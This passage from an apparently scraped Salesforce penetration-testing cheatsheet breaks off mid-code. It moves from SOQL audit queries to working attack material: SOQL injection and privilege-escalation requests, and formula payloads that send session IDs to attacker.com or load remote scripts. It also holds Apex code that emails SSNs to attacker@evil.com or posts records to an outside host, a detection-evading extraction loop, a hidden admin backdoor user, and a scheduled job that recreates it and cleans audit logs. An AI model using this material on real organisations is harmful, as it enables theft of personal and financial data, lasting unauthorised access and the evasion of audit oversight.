mass data extraction and abuse.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#3-data-loss-prevention-assessment","title":"3. Data Loss Prevention Assessment","text":"<p>Objective: Evaluate data loss prevention controls and identify leakage vectors.</p> <p>Email Security Configuration: <pre><code>-- Email deliverability settings\nSELECT Id, BounceManagementCompliance, IsActive\nFROM EmailDomainKey\n\n-- Email relay restrictions\nSELECT Id, EmailAddress, IsActive, CreatedDate\nFROM EmailRelay \nWHERE IsActive = true\n</code></pre></p> <p>File Upload/Download Controls: <pre><code>-- Content delivery settings\nSELECT Id, DomainName, Type, IsActive, CreatedDate\nFROM ContentDomain\n\n-- File sharing settings analysis\nSELECT Id, Name, ShareType, ExpirationDate, AllowDownload, \n       AllowPreview, IsPasswordRequired\nFROM ContentDistribution \nWHERE ExpirationDate &gt; TODAY OR ExpirationDate = null\n</code></pre></p> <p>External Sharing Assessment: <pre><code>-- External sharing rules\nSELECT Id, Name, AccountAccessLevel, Description, \n       SharedToType, SharedTo\nFROM AccountSharingRule \nWHERE SharedToType IN ('Group', 'Role', 'RoleAndSubordinates')\n\n-- Guest user sharing\nSELECT Id, ShareWithId, AccessLevel, RowCause\nFROM AccountShare \nWHERE ShareWithId IN (SELECT Id FROM User WHERE UserType = 'Guest')\n</code></pre></p> <p>Impact: Inadequate DLP controls enable unauthorized data sharing and exfiltration.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#api-security-testing","title":"API Security Testing","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#1-rest-api-security-assessment","title":"1. REST API Security Assessment","text":"<p>Objective: Comprehensive REST API security testing including authentication bypass and injection vulnerabilities.</p> <p>API Endpoint Discovery: <pre><code># Standard Salesforce REST endpoints\n/services/data/                    # Data API\n/services/data/v52.0/sobjects/     # SObject API\n/services/data/v52.0/query/        # SOQL Query\n/services/data/v52.0/search/       # SOSL Search\n/services/data/v52.0/analytics/    # Analytics API\n/services/apexrest/                # Custom Apex REST\n/services/async/                   # Bulk API\n\n# Custom endpoint enumeration\ncurl -H \"Authorization: Bearer $TOKEN\" \\\n  \"https://instance.salesforce.com/services/apexrest/\" | \\\n  grep -oP '(?&lt;=href=\")[^\"]*'\n</code></pre></p> <p>Authentication Security Testing: <pre><code># Test with invalid token\ncurl -i -H \"Authorization: Bearer invalid_token_12345\" \\\n  \"https://instance.salesforce.com/services/data/v52.0/sobjects/\"\n\n# Test with expired token\ncurl -i -H \"Authorization: Bearer expired_token\" \\\n  \"https://instance.salesforce.com/services/data/v52.0/sobjects/\"\n\n# Test token reuse across different IPs\ncurl -i -H \"Authorization: Bearer $VALID_TOKEN\" \\\n  -H \"X-Forwarded-For: 192.168.1.100\" \\\n  \"https://instance.salesforce.com/services/data/v52.0/sobjects/\"\n</code></pre></p> <p>Authorization Bypass Testing: <pre><code># Test IDOR - access records owned by other users\ncurl -H \"Authorization: Bearer $USER_TOKEN\" \\\n  \"https://instance.salesforce.com/services/data/v52.0/sobjects/Account/001XX000003DHPt\"\n\n# Test privilege escalation via API\ncurl -X PATCH \\\n  -H \"Authorization: Bearer $USER_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"ProfileId\":\"00eXX0000000001\"}' \\\n  \"https://instance.salesforce.com/services/data/v52.0/sobjects/User/005XX000001b0Qw\"\n\n# Test permission set assignment\ncurl -X POST \\\n  -H \"Authorization: Bearer $USER_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"PermissionSetId\":\"0PS000000000001\",\"AssigneeId\":\"005XX000001b0Qw\"}' \\\n  \"https://instance.salesforce.com/services/data/v52.0/sobjects/PermissionSetAssignment/\"\n</code></pre></p> <p>Injection Attack Testing: <pre><code># SOQL injection via query parameter\ncurl -G -H \"Authorization: Bearer $TOKEN\" \\\n  --data-urlencode \"q=SELECT Id FROM Account WHERE Name = 'test' UNION SELECT Id FROM User--\" \\\n  \"https://instance.salesforce.com/services/data/v52.0/query/\"\n\n# Advanced data extraction attempt\ncurl -G -H \"Authorization: Bearer $TOKEN\" \\\n  --data-urlencode \"q=SELECT Id FROM Account WHERE Name = 'x' OR (SELECT COUNT() FROM User WHERE Profile.Name = 'System Administrator') &gt; 0--\" \\\n  \"https://instance.salesforce.com/services/data/v52.0/query/\"\n\n# SOSL injection testing\ncurl -G -H \"Authorization: Bearer $TOKEN\" \\\n  --data-urlencode \"q=FIND 'test' RETURNING Account(Id), User(Id, Email, Profile.Name)\" \\\n  \"https://instance.salesforce.com/services/data/v52.0/search/\"\n</code></pre></p> <p>Impact: Unauthorized API access, data manipulation, privilege escalation.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#2-bulk-api-security-assessment","title":"2. Bulk API Security Assessment","text":"<p>Objective: Test Bulk API for data exfiltration capabilities and security controls.</p> <p>Bulk API Data Extraction Testing: <pre><code>import requests\nimport xml.etree.ElementTree as ET\n\nclass BulkAPITester:\n    def __init__(self, session_id, instance_url):\n        self.session_id = session_id\n        self.instance_url = instance_url\n        self.bulk_endpoint = f\"{instance_url}/services/async/52.0\"\n\n    def create_bulk_job(self, sobject_type, operation='query'):\n        \"\"\"Create a bulk API job\"\"\"\n        job_xml = f\"\"\"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n        &lt;jobInfo xmlns=\"http://www.force.com/2009/06/async/dataloader\"&gt;\n            &lt;operation&gt;{operation}&lt;/operation&gt;\n            &lt;object&gt;{sobject_type}&lt;/object&gt;\n            &lt;contentType&gt;CSV&lt;/contentType&gt;\n        &lt;/jobInfo&gt;\"\"\"\n\n        headers = {\n            'X-SFDC-Session': self.session_id,\n            'Content-Type': 'application/xml'\n        }\n\n        response = requests.post(\n            f\"{self.bulk_endpoint}/job\",\n            data=job_xml,\n            headers=headers\n        )\n\n        if response.status_code == 201:\n            root = ET.fromstring(response.content)\n            job_id = root.find('.//{http://www.force.com/2009/06/async/dataloader}id').text\n            return job_id\n        else:\n            print(f\"Job creation failed: {response.status_code}\")\n            return None\n\n    def add_batch(self, job_id, query):\n        \"\"\"Add batch to bulk job\"\"\"\n        headers = {\n            'X-SFDC-Session': self.session_id,\n            'Content-Type': 'text/csv'\n        }\n\n        response = requests.post(\n            f\"{self.bulk_endpoint}/job/{job_id}/batch\",\n            data=query,\n            headers=headers\n        )\n\n        if response.status_code == 201:\n            root = ET.fromstring(response.content)\n            batch_id = root.find('.//{http://www.force.com/2009/06/async/dataloader}id').text\n            return batch_id\n        else:\n            print(f\"Batch creation failed: {response.status_code}\")\n            return None\n\n    def test_bulk_extraction(self, sobject_type, sensitive_fields):\n        \"\"\"Test bulk data extraction\"\"\"\n        job_id = self.create_bulk_job(sobject_type)\n        if not job_id:\n            return False\n\n        query = f\"SELECT Id, {', '.join(sensitive_fields)} FROM {sobject_type}\"\n        batch_id = self.add_batch(job_id, query)\n\n        if not batch_id:\n            return False\n\n        print(f\"Bulk extraction job created: {job_id}, batch: {batch_id}\")\n        return True\n\n# Usage\ntester = BulkAPITester(session_id, instance_url)\nsensitive_fields = ['Name', 'Email', 'Phone', 'SSN__c']\ntester.test_bulk_extraction('Contact', sensitive_fields)\n</code></pre></p> <p>Impact: Bulk data exfiltration capability assessment.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#3-soap-api-security-testing","title":"3. SOAP API Security Testing","text":"<p>Objective: Assess SOAP API security including XML injection and session handling.</p> <p>SOAP Session Testing: <pre><code>&lt;!-- Test session hijacking via SOAP --&gt;\n&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" \n                  xmlns:urn=\"urn:enterprise.soap.sforce.com\"&gt;\n    &lt;soapenv:Header&gt;\n        &lt;urn:SessionHeader&gt;\n            &lt;urn:sessionId&gt;CAPTURED_SESSION_ID&lt;/urn:sessionId&gt;\n        &lt;/urn:SessionHeader&gt;\n    &lt;/soapenv:Header&gt;\n    &lt;soapenv:Body&gt;\n        &lt;urn:query&gt;\n            &lt;urn:queryString&gt;SELECT Id, Name FROM Account LIMIT 5&lt;/urn:queryString&gt;\n        &lt;/urn:query&gt;\n    &lt;/soapenv:Body&gt;\n&lt;/soapenv:Envelope&gt;\n</code></pre></p> <p>XML Injection Testing: <pre><code>&lt;!-- SOAP SOQL injection test --&gt;\n&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" \n                  xmlns:urn=\"urn:enterprise.soap.sforce.com\"&gt;\n    &lt;soapenv:Header&gt;\n        &lt;urn:SessionHeader&gt;\n            &lt;urn:sessionId&gt;SESSION_ID&lt;/urn:sessionId&gt;\n        &lt;/urn:SessionHeader&gt;\n    &lt;/soapenv:Header&gt;\n    &lt;soapenv:Body&gt;\n        &lt;urn:query&gt;\n            &lt;urn:queryString&gt;SELECT Id FROM Account WHERE Name = 'test' UNION SELECT Password__c FROM User--&lt;/urn:queryString&gt;\n        &lt;/urn:query&gt;\n    &lt;/soapenv:Body&gt;\n&lt;/soapenv:Envelope&gt;\n</code></pre></p> <p>Impact: Session hijacking, injection attacks, unauthorized data access.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#integration-security-assessment","title":"Integration Security Assessment","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#1-connected-apps-security-review","title":"1. Connected Apps Security Review","text":"<p>Objective: Assess OAuth implementations and connected application security.</p> <p>Connected Apps Analysis: <pre><code>-- Comprehensive connected apps analysis\nSELECT Id, Name, ContactEmail, CallbackUrl, ConsumerKey, \n       CreatedDate, CreatedBy.Name, Description, MobileSessionTimeout,\n       RefreshTokenValidityPeriod, UsersCanSelfAuthorize,\n       OptionsFullScopeApprovals\nFROM ConnectedApplication \nORDER BY CreatedDate DESC\n\n-- OAuth flow analysis\nSELECT Id, App.Name, UserId, User.Username, User.Email, \n       IssuedDate, ExpirationDate, UseCount, LastUsedDate,\n       Scopes, RedirectUri\nFROM OAuth2Authorization \nORDER BY LastUsedDate DESC NULLS LAST\n\n-- Refresh token analysis\nSELECT Id, AppName, User.Username, User.Email, UseCount,\n       LastUsedDate, IssuedDate, ExpirationDate\nFROM OAuth2PeriodicRefreshToken \nORDER BY LastUsedDate DESC\n</code></pre></p> <p>OAuth Security Testing: <pre><code>def test_oauth_flow(client_id, redirect_uri, authorization_endpoint):\n    \"\"\"Test OAuth authorization code flow security\"\"\"\n    # Standard authorization request\n    auth_url = f\"{authorization_endpoint}?\" \\\n               f\"client_id={client_id}&amp;\" \\\n               f\"redirect_uri={redirect_uri}&amp;\" \\\n               f\"response_type=code&amp;\" \\\n               f\"scope=full\"\n\n    print(f\"Authorization URL: {auth_url}\")\n\n    # Test redirect URI manipulation\n    malicious_redirect = \"https://attacker.com/callback\"\n    malicious_url = f\"{authorization_endpoint}?\" \\\n                   f\"client_id={client_id}&amp;\" \\\n                   f\"redirect_uri={malicious_redirect}&amp;\" \\\n                   f\"response_type=code&amp;\" \\\n                   f\"scope=full\"\n\n    print(f\"Malicious redirect test: {malicious_url}\")\n\n    # Test state parameter absence (CSRF protection)\n    no_state_url = f\"{authorization_endpoint}?\" \\\n                  f\"client_id={client_id}&amp;\" \\\n                  f\"redirect_uri={redirect_uri}&amp;\" \\\n                  f\"response_type=code&amp;\" \\\n                  f\"scope=full\"\n\n    print(f\"No state parameter: {no_state_url}\")\n\n# Token validation testing\ndef test_token_security(access_token, refresh_token, client_id):\n    \"\"\"Test OAuth token security\"\"\"\n    # Test token with different scopes\n    response = requests.get(\n        \"https://instance.salesforce.com/services/data/v52.0/sobjects/User/\",\n        headers={\"Authorization\": f\"Bearer {access_token}\"}\n    )\n\n    # Test refresh token reuse\n    refresh_response = requests.post(\n        \"https://instance.salesforce.com/services/oauth2/token\",\n        data={\n            \"grant_type\": \"refresh_token\",\n            \"refresh_token\": refresh_token,\n            \"client_id\": client_id\n        }\n    )\n</code></pre></p> <p>Impact: OAuth hijacking, unauthorized app access, token abuse.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#2-named-credentials-security-assessment","title":"2. Named Credentials Security Assessment","text":"<p>Objective: Evaluate external service integration security and credential management.</p> <p>Named Credentials Analysis: <pre><code>-- Named credentials configuration\nSELECT Id, DeveloperName, Endpoint, PrincipalType, Protocol,\n       AuthTokenEndpointUrl, JwtAudience, JwtIssuer,\n       Username\nFROM NamedCredential\n\n-- External services using named credentials\nSELECT Id, DeveloperName, ExternalServiceProviderId, \n       Description, Status\nFROM ExternalServiceRegistration\n</code></pre></p> <p>External Service Security Testing: <pre><code>// Test named credential security\npublic class NamedCredentialTester {\n    public static void testExternalCall(String namedCredential) {\n        HttpRequest req = new HttpRequest();\n        req.setEndpoint('callout:' + namedCredential + '/api/sensitive-data');\n        req.setMethod('GET');\n\n        Http http = new Http();\n        try {\n            HttpResponse res = http.send(req);\n            System.debug('Response: ' + res.getStatusCode());\n            System.debug('Body: ' + res.getBody());\n        } catch (Exception e) {\n            System.debug('Error: ' + e.getMessage());\n        }\n    }\n}\n</code></pre></p> <p>Certificate Validation Testing: <pre><code>def test_certificate_validation(endpoint):\n    \"\"\"Test SSL certificate validation\"\"\"\n    import urllib3\n    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n    try:\n        # Test with invalid certificate\n        response = requests.get(endpoint, verify=False, timeout=10)\n        print(f\"Insecure connection accepted: {response.status_code}\")\n    except Exception as e:\n        print(f\"Insecure connection rejected: {e}\")\n\n    try:\n        # Test with proper certificate validation\n        response = requests.get(endpoint, verify=True, timeout=10)\n        print(f\"Secure connection successful: {response.status_code}\")\n    except Exception as e:\n        print(f\"Certificate validation failed: {e}\")\n</code></pre></p> <p>Impact: Man-in-the-middle attacks, credential compromise, external service abuse.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#advanced-attack-vectors","title":"Advanced Attack Vectors","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#1-formula-injection-attacks","title":"1. Formula Injection Attacks","text":"<p>Objective: Identify and exploit formula injection vulnerabilities in calculated fields and validation rules.</p> <p>Formula Field Discovery: <pre><code>-- Formula fields with potential injection risks\nSELECT Id, QualifiedApiName, Label, FormulaSourceText,\n       EntityDefinition.QualifiedApiName as ObjectName\nFROM FieldDefinition \nWHERE DataType IN ('Text', 'Url') \n  AND FormulaSourceText != null \n  AND (FormulaSourceText LIKE '%HYPERLINK%' OR FormulaSourceText LIKE '%IMAGE%')\n\n-- Validation rules with formulas\nSELECT Id, ValidationName, ErrorConditionFormula, ErrorMessage,\n       EntityDefinition.QualifiedApiName as ObjectName, IsActive\nFROM ValidationRule \nWHERE IsActive = true \n  AND (ErrorConditionFormula LIKE '%HYPERLINK%' OR ErrorConditionFormula LIKE '%TEXT%')\n</code></pre></p> <p>Formula Injection Payloads: <pre><code>// Information disclosure\nHYPERLINK(\"http://attacker.com/exfil?session=\" &amp; $Api.Session_ID, \"Click Here\")\n\n// User context information\nHYPERLINK(\"http://attacker.com/exfil?user=\" &amp; $User.Id &amp; \"&amp;org=\" &amp; $Organization.Id, \"Link\")\n\n// Cross-site scripting via formulas\nHYPERLINK(\"javascript:alert('XSS via Formula')\", \"Click for XSS\")\n\n// Advanced payload with data exfiltration\nHYPERLINK(\"javascript:void((function(){var s=document.createElement('script');s.src='//attacker.com/steal.js';document.head.appendChild(s);})())\", \"Malicious Link\")\n\n// File system access (if enabled)\nHYPERLINK(\"file:///etc/passwd\", \"System Files\")\nHYPERLINK(\"\\\\\\\\attacker.com\\\\share\\\\malicious.exe\", \"Network Resource\")\n</code></pre></p> <p>Automated Formula Injection Testing: <pre><code>public class FormulaInjectionTester {\n    public static void testFormulaInjection(String objectName, String fieldName) {\n        Schema.SObjectType objectType = Schema.getGlobalDescribe().get(objectName);\n        SObject testRecord = objectType.newSObject();\n\n        List&lt;String&gt; payloads = new List&lt;String&gt;{\n            '&lt;script&gt;alert(\"XSS\")&lt;/script&gt;',\n            'javascript:alert(\"XSS\")',\n            '\"&gt;&lt;script&gt;alert(\"XSS\")&lt;/script&gt;',\n            '\\';alert(\"XSS\");var a=\\'',\n            'http://attacker.com/steal?data='\n        };\n\n        for (String payload : payloads) {\n            try {\n                testRecord.put(fieldName, payload);\n                insert testRecord;\n\n                String query = 'SELECT Id, ' + fieldName + ' FROM ' + objectName + \n                              ' WHERE Id = \\'' + testRecord.Id + '\\'';\n                List&lt;SObject&gt; results = Database.query(query);\n\n                if (!results.isEmpty()) {\n                    String resultValue = String.valueOf(results[0].get(fieldName));\n                    if (resultValue.contains('javascript:') || resultValue.contains('&lt;script&gt;')) {\n                        System.debug('Potential formula injection: ' + payload);\n                    }\n                }\n\n                delete testRecord;\n            } catch (Exception e) {\n                System.debug('Payload blocked: ' + payload + ' - ' + e.getMessage());\n            }\n        }\n    }\n}\n</code></pre></p> <p>Impact: Information disclosure, client-side code execution, data exfiltration.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#2-process-automation-exploitation","title":"2. Process Automation Exploitation","text":"<p>Objective: Identify security vulnerabilities in Process Builder, Flow, and Workflow automation.</p> <p>Process &amp; Flow Discovery: <pre><code>-- Active processes and flows\nSELECT Id, DeveloperName, ProcessType, Status, Description,\n       LastModifiedDate, LastModifiedBy.Name, TriggerType\nFROM Flow \nWHERE Status = 'Active' \n  AND ProcessType IN ('Flow', 'Workflow', 'AutoLaunchedFlow')\n\n-- Process builder definitions\nSELECT Id, Name, Type, State, Description, TableEnumOrId,\n       CreatedDate, LastModifiedDate, LastModifiedBy.Name\nFROM ProcessDefinition \nWHERE State = 'Active'\n\n-- Flow interviews (execution instances)\nSELECT Id, Name, CurrentElement, FlowVersionView.ProcessType,\n       StartTime, PauseTime, CreatedDate, CreatedBy.Name\nFROM FlowInterview \nWHERE CreatedDate = TODAY \nORDER BY StartTime DESC\n</code></pre></p> <p>Process Automation Security Testing: <pre><code>// Test flow input validation\npublic class FlowSecurityTester {\n    public static void testFlowInputValidation(String flowApiName) {\n        Map&lt;String, Object&gt; inputVariables = new Map&lt;String, Object&gt;();\n\n        // Injection payloads for flow inputs\n        inputVariables.put('textInput', '&lt;script&gt;alert(\"XSS\")&lt;/script&gt;');\n        inputVariables.put('emailInput', 'test@example.com; DELETE FROM Account;');\n        inputVariables.put('numberInput', '1; DROP TABLE User;');\n\n        try {\n            Flow.Interview flowInterview = Flow.Interview.createInterview(flowApiName, inputVariables);\n            flowInterview.start();\n            System.debug('Flow executed with malicious input');\n        } catch (Exception e) {\n            System.debug('Flow execution blocked: ' + e.getMessage());\n        }\n    }\n}\n\n// Test for privilege escalation in system context\npublic class PrivilegeEscalationTest {\n    public static void testSystemContextAbuse() {\n        Profile standardProfile = [SELECT Id FROM Profile WHERE Name = 'Standard User' LIMIT 1];\n        User testUser = new User(\n            Username = 'lowpriv@test.com',\n            Email = 'lowpriv@test.com',\n            LastName = 'LowPriv',\n            Alias = 'lowpriv',\n            ProfileId = standardProfile.Id,\n            TimeZoneSidKey = 'America/New_York',\n            LocaleSidKey = 'en_US',\n            EmailEncodingKey = 'UTF-8',\n            LanguageLocaleKey = 'en_US'\n        );\n        insert testUser;\n\n        System.runAs(testUser) {\n            Account testAccount = new Account(Name = 'Privilege Escalation Test');\n            insert testAccount;\n\n            try {\n                List&lt;User&gt; adminUsers = [SELECT Id FROM User WHERE Profile.Name = 'System Administrator'];\n                if (!adminUsers.isEmpty()) {\n                    System.debug('Unauthorized access to admin users via process');\n                }\n            } catch (Exception e) {\n                System.debug('Process properly enforced security: ' + e.getMessage());\n            }\n        }\n    }\n}\n</code></pre></p> <p>Impact: Automated privilege escalation, system abuse, data manipulation.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#3-metadata-api-security-exploitation","title":"3. Metadata API Security Exploitation","text":"<p>Objective: Test metadata manipulation capabilities for security control bypass.</p> <p>Metadata API Access Testing: <pre><code>&lt;!-- Test metadata retrieval --&gt;\n&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" \n                  xmlns:met=\"http://soap.sforce.com/2006/04/metadata\"&gt;\n    &lt;soapenv:Header&gt;\n        &lt;met:SessionHeader&gt;\n            &lt;met:sessionId&gt;SESSION_ID&lt;/met:sessionId&gt;\n        &lt;/met:SessionHeader&gt;\n    &lt;/soapenv:Header&gt;\n    &lt;soapenv:Body&gt;\n        &lt;met:listMetadata&gt;\n            &lt;met:queries&gt;\n                &lt;met:type&gt;Profile&lt;/met:type&gt;\n            &lt;/met:queries&gt;\n            &lt;met:asOfVersion&gt;52.0&lt;/met:asOfVersion&gt;\n        &lt;/met:listMetadata&gt;\n    &lt;/soapenv:Body&gt;\n&lt;/soapenv:Envelope&gt;\n</code></pre></p> <p>Security Control Bypass Attempts: <pre><code>&lt;!-- Attempt to modify profile permissions --&gt;\n&lt;Profile xmlns=\"http://soap.sforce.com/2006/04/metadata\"&gt;\n    &lt;fullName&gt;Standard User&lt;/fullName&gt;\n    &lt;userPermissions&gt;\n        &lt;enabled&gt;true&lt;/enabled&gt;\n        &lt;name&gt;ModifyAllData&lt;/name&gt;\n    &lt;/userPermissions&gt;\n    &lt;userPermissions&gt;\n        &lt;enabled&gt;true&lt;/enabled&gt;\n        &lt;name&gt;ViewAllData&lt;/name&gt;\n    &lt;/userPermissions&gt;\n&lt;/Profile&gt;\n\n&lt;!-- Disable security validation rules --&gt;\n&lt;ValidationRule xmlns=\"http://soap.sforce.com/2006/04/metadata\"&gt;\n    &lt;fullName&gt;Security_Validation_Rule&lt;/fullName&gt;\n    &lt;active&gt;false&lt;/active&gt;\n    &lt;errorConditionFormula&gt;false&lt;/errorConditionFormula&gt;\n    &lt;errorMessage&gt;Bypassed security validation&lt;/errorMessage&gt;\n&lt;/ValidationRule&gt;\n</code></pre></p> <p>Metadata Deployment Testing: <pre><code>def test_metadata_deployment(session_id, instance_url, metadata_xml):\n    \"\"\"Test metadata deployment capabilities\"\"\"\n    import base64\n\n    encoded_metadata = base64.b64encode(metadata_xml.encode()).decode()\n\n    deployment_xml = f\"\"\"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n    &lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" \n                      xmlns:met=\"http://soap.sforce.com/2006/04/metadata\"&gt;\n        &lt;soapenv:Header&gt;\n            &lt;met:SessionHeader&gt;\n                &lt;met:sessionId&gt;{session_id}&lt;/met:sessionId&gt;\n            &lt;/met:SessionHeader&gt;\n        &lt;/soapenv:Header&gt;\n        &lt;soapenv:Body&gt;\n            &lt;met:deploy&gt;\n                &lt;met:ZipFile&gt;{encoded_metadata}&lt;/met:ZipFile&gt;\n                &lt;met:DeployOptions&gt;\n                    &lt;met:allowMissingFiles&gt;false&lt;/met:allowMissingFiles&gt;\n                    &lt;met:autoUpdatePackage&gt;false&lt;/met:autoUpdatePackage&gt;\n                    &lt;met:checkOnly&gt;true&lt;/met:checkOnly&gt;\n                    &lt;met:ignoreWarnings&gt;false&lt;/met:ignoreWarnings&gt;\n                    &lt;met:performRetrieve&gt;false&lt;/met:performRetrieve&gt;\n                    &lt;met:rollbackOnError&gt;true&lt;/met:rollbackOnError&gt;\n                    &lt;met:singlePackage&gt;true&lt;/met:singlePackage&gt;\n                &lt;/met:DeployOptions&gt;\n            &lt;/met:deploy&gt;\n        &lt;/soapenv:Body&gt;\n    &lt;/soapenv:Envelope&gt;\"\"\"\n\n    headers = {\n        'Content-Type': 'text/xml; charset=UTF-8',\n        'SOAPAction': 'deploy'\n    }\n\n    response = requests.post(\n        f\"{instance_url}/services/Soap/m/52.0\",\n        data=deployment_xml,\n        headers=headers\n    )\n\n    if response.status_code == 200:\n        print(\"Metadata deployment test completed\")\n        return response.text\n    else:\n        print(f\"Metadata deployment failed: {response.status_code}\")\n        return None\n</code></pre></p> <p>Impact: Security control bypass, unauthorized configuration changes.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#post-exploitation-persistence","title":"Post-Exploitation &amp; Persistence","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#1-data-exfiltration-techniques","title":"1. Data Exfiltration Techniques","text":"<p>Objective: Methods for extracting data after gaining unauthorized access.</p> <p>Bulk Data Extraction: <pre><code>-- Comprehensive data extraction queries\nSELECT Id, Name, Email, Phone, SSN__c, Credit_Card__c \nFROM Contact \nLIMIT 50000\n\n-- Incremental extraction to avoid detection\nSELECT Id, Name, AnnualRevenue, LastModifiedDate \nFROM Account \nWHERE LastModifiedDate &gt; 2023-01-01T00:00:00Z\n\n-- Relationship traversal for connected data\nSELECT Id, Name, (SELECT Id, Email, Phone FROM Contacts) \nFROM Account\n\n-- Financial data extraction\nSELECT Id, Name, Amount, CloseDate, StageName,\n       (SELECT Id, Name FROM Account) \nFROM Opportunity \nWHERE Amount &gt; 100000\n</code></pre></p> <p>Stealth Extraction Methods: <pre><code>def stealth_data_extraction(session_id, instance_url):\n    \"\"\"Extract data using small, frequent queries to avoid detection\"\"\"\n    import time\n    import random\n\n    headers = {'Authorization': f'Bearer {session_id}'}\n    extracted_data = []\n\n    # Small batch sizes with random delays\n    batch_size = 50\n    delay_range = (5, 15)  # 5-15 seconds between requests\n\n    offset = 0\n    while True:\n        query = f\"SELECT Id, Name, Email FROM Contact LIMIT {batch_size} OFFSET {offset}\"\n\n        response = requests.get(\n            f\"{instance_url}/services/data/v52.0/query\",\n            headers=headers,\n            params={'q': query}\n        )\n\n        if response.status_code == 200:\n            data = response.json()\n            if not data['records']:\n                break\n\n            extracted_data.extend(data['records'])\n            offset += batch_size\n\n            # Random delay to avoid detection\n            time.sleep(random.uniform(*delay_range))\n        else:\n            break\n\n    return extracted_data\n</code></pre></p> <p>Alternative Exfiltration Channels: <pre><code>// Email-based exfiltration\npublic class EmailExfiltration {\n    public static void exfiltrateViaEmail() {\n        List&lt;Contact&gt; sensitiveContacts = [SELECT Id, Name, Email, SSN__c FROM Contact LIMIT 100];\n\n        String csvData = 'Name,Email,SSN\\n';\n        for (Contact c : sensitiveContacts) {\n            csvData += c.Name + ',' + c.Email + ',' + c.SSN__c + '\\n';\n        }\n\n        Messaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();\n        email.setToAddresses(new String[]{'attacker@evil.com'});\n        email.setSubject('Data Export');\n        email.setPlainTextBody(csvData);\n\n        Messaging.sendEmail(new Messaging.SingleEmailMessage[]{email});\n    }\n}\n\n// HTTP callout exfiltration\npublic class HttpExfiltration {\n    @future(callout=true)\n    public static void exfiltrateViaHttp() {\n        List&lt;Account&gt; accounts = [SELECT Id, Name, AnnualRevenue FROM Account LIMIT 100];\n\n        String jsonData = JSON.serialize(accounts);\n\n        HttpRequest req = new HttpRequest();\n        req.setEndpoint('https://attacker.com/collect');\n        req.setMethod('POST');\n        req.setBody(jsonData);\n\n        Http http = new Http();\n        HttpResponse res = http.send(req);\n    }\n}\n</code></pre></p> <p>Impact: Intellectual property theft, compliance violations, competitive advantage loss.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#2-persistence-mechanisms","title":"2. Persistence Mechanisms","text":"<p>Objective: Techniques for maintaining access to compromised systems.</p> <p>Backdoor User Creation: <pre><code>public class PersistenceManager {\n    public static void createBackdoorUser() {\n        // Create hidden administrative user\n        Profile adminProfile = [SELECT Id FROM Profile WHERE Name = 'System Administrator' LIMIT 1];\n\n        User backdoorUser = new User(\n            Username = 'maintenance@company-domain.com',\n            Email = 'maintenance@company-domain.com',\n            FirstName = 'System',\n            LastName = 'Maintenance',\n            Alias = 'sysmaint',\n            ProfileId = adminProfile.Id,\n            TimeZoneSidKey = 'America/New_York',\n            LocaleSidKey = 'en_US',\n            EmailEncodingKey = 'UTF-8',\n            LanguageLocaleKey = 'en_US',\n            IsActive = true\n        );\n\n        insert backdoorUser;\n\n        // Assign additional permissions\n        PermissionSet adminPermSet = [SELECT Id FROM PermissionSet WHERE Name = 'Custom_Admin_Access' LIMIT 1];\n        PermissionSetAssignment psa = new PermissionSetAssignment(\n            PermissionSetId = adminPermSet.Id,\n            AssigneeId = backdoorUser.Id\n        );\n        insert psa;\n    }\n}\n</code></pre></p> <p>Connected App Persistence: <pre><code>&lt;!-- Register persistent OAuth application --&gt;\n&lt;ConnectedApplication xmlns=\"http://soap.sforce.com/2006/04/metadata\"&gt;\n    &lt;fullName&gt;MaintenanceApp&lt;/fullName&gt;\n    &lt;label&gt;System Maintenance Tool&lt;/label&gt;\n    &lt;contactEmail&gt;maintenance@company.com&lt;/contactEmail&gt;\n    &lt;description&gt;Internal system maintenance application&lt;/description&gt;\n    &lt;oauthConfig&gt;\n        &lt;callbackUrl&gt;https://maintenance.company.com/callback&lt;/callbackUrl&gt;\n        &lt;scopes&gt;Full&lt;/scopes&gt;\n        &lt;consumerKey&gt;HIDDEN_CONSUMER_KEY&lt;/consumerKey&gt;\n        &lt;consumerSecret&gt;HIDDEN_CONSUMER_SECRET&lt;/consumerSecret&gt;\n    &lt;/oauthConfig&gt;\n&lt;/ConnectedApplication&gt;\n</code></pre></p> <p>Scheduled Job Implantation: <pre><code>// Apex scheduled job for persistence\nglobal class BackdoorMaintenanceJob implements Schedulable {\n    global void execute(SchedulableContext sc) {\n        // Maintain backdoor access\n        maintainBackdoorUser();\n\n        // Periodic data collection\n        collectSensitiveData();\n\n        // Clean up traces\n        cleanAuditLogs();\n    }\n\n    private void maintainBackdoorUser() {\n        List&lt;User&gt; backdoorUsers = [SELECT Id FROM User WHERE Username = 'maintenance@company-domain.com'];\n        if (backdoorUsers.isEmpty()) {\n            // Recreate backdoor if detected and removed\n            PersistenceManager.createBackdoorUser();\n        }\n    }\n\n    private void collectSensitiveData() {\n        // Periodic data collection logic\n        List&lt;Account&gt; 